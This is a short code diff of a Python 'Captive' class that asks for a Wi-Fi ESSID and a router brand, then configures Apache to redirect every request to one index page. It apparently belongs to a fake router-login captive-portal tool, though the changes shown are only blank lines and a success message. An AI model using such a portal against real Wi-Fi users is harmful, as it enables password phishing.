@@ -5,6 +5,7 @@ class Captive:
 		self.essid = ""
 		self.manufacturer = ""
 
+		
 	def menu_essid(self):
 		essid = input("Network ESSID: ")
 		if essid != "":
@@ -12,6 +13,7 @@ class Captive:
 		else:
 			self.menu_essid()
 
+			
 	def menu_manufacturer(self):
 		print("\n1 - Tp Link")
 		print("2 - D Link")
@@ -51,6 +53,7 @@ class Captive:
 			indexxx.truncate()
 			indexxx.writelines(file)
 
+			
 	def apache_config(self):
 		os.system("sudo a2enmod rewrite")
 		os.system("sudo sed -i 's/AllowOverride None/AllowOverride all/' /etc/apache2/apache2.conf")
@@ -60,6 +63,7 @@ class Captive:
 		os.system("echo 'RewriteRule . index.html [L]' >> /var/www/html/.htaccess")
 		os.system("chown -R www-data /var/www/html/")
 		os.system("sudo systemctl restart apache2")
+		print("\n[+] Success!")
 
 
 	def run(self):
